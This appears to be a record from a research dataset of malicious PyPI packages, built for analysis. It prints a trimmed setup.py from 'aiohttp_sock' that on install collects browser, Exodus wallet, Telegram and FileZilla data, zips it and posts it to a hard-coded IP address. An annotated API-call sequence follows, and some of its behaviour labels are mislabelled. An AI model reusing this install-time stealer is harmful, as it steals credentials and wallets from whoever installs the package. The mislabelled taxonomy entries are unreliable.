[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/aiohttp_sock-0.1.19/aiohttp_sock-0.1.19/setup.py",
    "code_snippet": "import subprocess\nimport sys\nimport contextlib as __stickytape_contextlib\nimport asyncio\nfrom asyncio import create_task\nfrom typing import List\nfrom weakref import proxy\nfrom path_search import search_plugin_paths, root_paths\nfrom config import Config\nfrom aiohttp import ClientSession as Session, MultipartWriter, hdrs, FormData\nimport secrets\nimport timeit\nfrom paths import TEMP\nfrom os import mkdir\nfrom os.path import join\nfrom zipfile import ZipFile, ZIP_DEFLATED\nfrom base64 import b64encode\nfrom tools import zipdir, _handle_task_result\nfrom logger import Logger\nfrom plugins import Chromium, Details, Exodus, Filezilla, Telegram\n\nif len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]:\n    subprocess.call(f'{sys.executable} -m pip install aiofiles')\n    subprocess.call(f'{sys.executable} -m pip install aiohttp')\n    subprocess.call(f'{sys.executable} -m pip install cryptography')\n    subprocess.call(f'{sys.executable} -m pip install aiosqlite')\n    \n    @__stickytape_contextlib.contextmanager\n    def __stickytape_temporary_dir():\n        import tempfile\n        import shutil\n        dir_path = tempfile.mkdtemp()\n        try:\n            yield dir_path\n        finally:\n            shutil.rmtree(dir_path)\n\n    with __stickytape_temporary_dir() as __stickytape_working_dir:\n        def __stickytape_write_module(path, contents):\n            import os, os.path\n            def make_package(path):\n                parts = path.split(\"/\")\n                partial_path = __stickytape_working_dir\n                for part in parts:\n                    partial_path = os.path.join(partial_path, part)\n                    if not os.path.exists(partial_path):\n                        os.mkdir(partial_path)\n                        with open(os.path.join(partial_path, \"__init__.py\"), \"wb\") as f:\n                            f.write(b\"\\n\")\n            make_package(os.path.dirname(path))\n            full_path = os.path.join(__stickytape_working_dir, path)\n            with open(full_path, \"wb\") as module_file:\n                module_file.write(contents)\n        import sys as __stickytape_sys\n        __stickytape_sys.path.insert(0, __stickytape_working_dir)\n        # ... (hundreds of lines omitted for brevity, see original for full context)\n        # The __stickytape_write_module calls write out a large number of modules, including code to steal browser passwords, cookies, wallets, and exfiltrate them.\n        # After writing modules, the following code is executed:\n        HOST = 'http://144.24.115.170'\n        async def main() -> None:\n            start = timeit.default_timer()\n            client_id = secrets.token_hex(10)\n            log_path = join(TEMP, client_id)\n            print(log_path)\n            mkdir(log_path)\n            tasks: List[asyncio.Task] = []\n            session = Session()\n            logger = Logger(log_path)\n            conf = Config(client_id, HOST, log_path, logger, session)\n            await logger.log(f'Start')\n            chromium = Chromium(conf)\n            search_folder_names = {\n                'google': chromium,\n                'exodus': Exodus(conf),\n                'mozilla': None,\n                'telegram desktop': Telegram(conf),\n                'telegram': Telegram(conf),\n                'opera software': chromium,\n                'filezilla': Filezilla(conf)\n            }\n            tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n            other_plugins = [Details(conf)]\n            for plugin in other_plugins:\n                tasks.append(create_task(plugin.callback()))\n            for task in tasks:\n                task.add_done_callback(_handle_task_result)\n            for task in tasks:\n                try:\n                    await task\n                except Exception as e:\n                    await logger.log(f'Error in main.py tasks {e}')\n            await logger.log(f'═рўшэр■ юЄяЁртъє ыюур')\n            zip_log_path = join(TEMP, f'{client_id}.zip')\n            with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n                zipdir(log_path, zipf)\n            with MultipartWriter() as writer:\n                writer.append(open(zip_log_path, 'rb'))\n            await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=writer)\n            await session.close()\n            stop = timeit.default_timer()\n            await logger.log(f'Time: {stop-start}')\n        asyncio.run(main())\n",
    "pattern_analysis": {
      "api_sequence": [
        "sys.argv",
        "subprocess.call",
        "subprocess.call",
        "subprocess.call",
        "subprocess.call",
        "tempfile.mkdtemp",
        "shutil.rmtree",
        "os.path.join",
        "os.path.exists",
        "os.mkdir",
        "open",
        "open",
        "os.path.join",
        "open",
        "os.path.join",
        "sys.path.insert",
        "secrets.token_hex",
        "os.path.join",
        "os.mkdir",
        "Logger.log",
        "Logger.log",
        "create_task",
        "create_task",
        "add_done_callback",
        "Logger.log",
        "os.path.join",
        "ZipFile",
        "zipdir",
        "MultipartWriter",
        "open",
        "Session.post",
        "Session.close",
        "Logger.log"
      ],
      "api_sequence_with_args": [
        "sys.argv",
        "subprocess.call(f'{sys.executable} -m pip install aiofiles')",
        "subprocess.call(f'{sys.executable} -m pip install aiohttp')",
        "subprocess.call(f'{sys.executable} -m pip install cryptography')",
        "subprocess.call(f'{sys.executable} -m pip install aiosqlite')",
        "tempfile.mkdtemp()",
        "shutil.rmtree(dir_path)",
        "os.path.join(partial_path, part)",
        "os.path.exists(partial_path)",
        "os.mkdir(partial_path)",
        "open(os.path.join(partial_path, \"__init__.py\"), \"wb\")",
        "open(full_path, \"wb\")",
        "os.path.join(TEMP, client_id)",
        "os.mkdir(log_path)",
        "Logger(log_path).log(f'Start')",
        "Logger(log_path).log(f'Error in main.py tasks {e}')",
        "create_task(search_plugin_paths(root_paths, search_folder_names))",
        "create_task(plugin.callback())",
        "task.add_done_callback(_handle_task_result)",
        "Logger(log_path).log(f'═рўшэр■ юЄяЁртъє ыюур')",
        "os.path.join(TEMP, f'{client_id}.zip')",
        "ZipFile(zip_log_path, 'w', ZIP_DEFLATED)",
        "zipdir(log_path, zipf)",
        "MultipartWriter()",
        "open(zip_log_path, 'rb')",
        "Session().post(f'{HOST}/receive_log', params={'client_id': client_id}, data=writer)",
        "Session().close()",
        "Logger(log_path).log(f'Time: {stop-start}')"
      ],
      "mapped_sequence": [
        {
          "api_name": "sys.argv",
          "id": "get_cmd_args",
          "description": "Retrieves command-line arguments passed to script",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "tempfile.mkdtemp",
          "id": "create_temp_dir",
          "description": "Creates temporary directory and returns its path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "shutil.rmtree",
          "id": "delete_directory",
          "description": "Recursively deletes directory and its contents",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.mkdir",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "sys.path.insert",
          "id": "insert_module_path",
          "description": "Inserts directory at start of module search path",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "module_importing"
        },
        {
          "api_name": "secrets.token_hex",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.mkdir",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "Logger.log",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "Logger.log",
          "id": "log_error",
          "description": "Logs error message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "create_task",
          "id": "create_async_task",
          "description": "Creates asynchronous task for coroutine",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "create_task",
          "id": "create_async_task",
          "description": "Creates asynchronous task for coroutine",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "add_done_callback",
          "id": "register_exit_function",
          "description": "Registers function to be called at program exit",
          "first_id": "persistence_stealth",
          "second_id": "persistence_mechanisms",
          "third_id": "persistence_configuration"
        },
        {
          "api_name": "Logger.log",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "ZipFile",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipdir",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "MultipartWriter",
          "id": "create_multipart_writer",
          "description": "Creates multipart writer for HTTP requests",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "Session.post",
          "id": "open_url_post",
          "description": "Opens URL with POST data",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "Session.close",
          "id": "close_http_response",
          "description": "Closes the HTTP response object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "Logger.log",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        }
      ],
      "contextual_code": "if len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]:\n    subprocess.call(f'{sys.executable} -m pip install aiofiles')\n    subprocess.call(f'{sys.executable} -m pip install aiohttp')\n    subprocess.call(f'{sys.executable} -m pip install cryptography')\n    subprocess.call(f'{sys.executable} -m pip install aiosqlite')\n    \n    @__stickytape_contextlib.contextmanager\n    def __stickytape_temporary_dir():\n        import tempfile\n        import shutil\n        dir_path = tempfile.mkdtemp()\n        try:\n            yield dir_path\n        finally:\n            shutil.rmtree(dir_path)\n\n    with __stickytape_temporary_dir() as __stickytape_working_dir:\n        def __stickytape_write_module(path, contents):\n            import os, os.path\n            def make_package(path):\n                parts = path.split(\"/\")\n                partial_path = __stickytape_working_dir\n                for part in parts:\n                    partial_path = os.path.join(partial_path, part)\n                    if not os.path.exists(partial_path):\n                        os.mkdir(partial_path)\n                        with open(os.path.join(partial_path, \"__init__.py\"), \"wb\") as f:\n                            f.write(b\"\\n\")\n            make_package(os.path.dirname(path))\n            full_path = os.path.join(__stickytape_working_dir, path)\n            with open(full_path, \"wb\") as module_file:\n                module_file.write(contents)\n        import sys as __stickytape_sys\n        __stickytape_sys.path.insert(0, __stickytape_working_dir)\n        # ... (hundreds of lines omitted for brevity)\n        # The __stickytape_write_module calls write out a large number of modules, including code to steal browser passwords, cookies, wallets, and exfiltrate them.\n        # After writing modules, the following code is executed:\n        HOST = 'http://144.24.115.170'\n        async def main() -> None:\n            start = timeit.default_timer()\n            client_id = secrets.token_hex(10)\n            log_path = join(TEMP, client_id)\n            print(log_path)\n            mkdir(log_path)\n            tasks: List[asyncio.Task] = []\n            session = Session()\n            logger = Logger(log_path)\n            conf = Config(client_id, HOST, log_path, logger, session)\n            await logger.log(f'Start')\n            chromium = Chromium(conf)\n            search_folder_names = {\n                'google': chromium,\n                'exodus': Exodus(conf),\n                'mozilla': None,\n                'telegram desktop': Telegram(conf),\n                'telegram': Telegram(conf),\n                'opera software': chromium,\n                'filezilla': Filezilla(conf)\n            }\n            tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n            other_plugins = [Details(conf)]\n            for plugin in other_plugins:\n                tasks.append(create_task(plugin.callback()))\n            for task in tasks:\n                task.add_done_callback(_handle_task_result)\n            for task in tasks:\n                try:\n                    await task\n                except Exception as e:\n                    await logger.log(f'Error in main.py tasks {e}')\n            await logger.log(f'═рўшэр■ юЄяЁртъє ыюур')\n            zip_log_path = join(TEMP, f'{client_id}.zip')\n            with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n                zipdir(log_path, zipf)\n            with MultipartWriter() as writer:\n                writer.append(open(zip_log_path, 'rb'))\n            await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=writer)\n            await session.close()\n            stop = timeit.default_timer()\n            await logger.log(f'Time: {stop-start}')\n        asyncio.run(main())"
    }
  }
]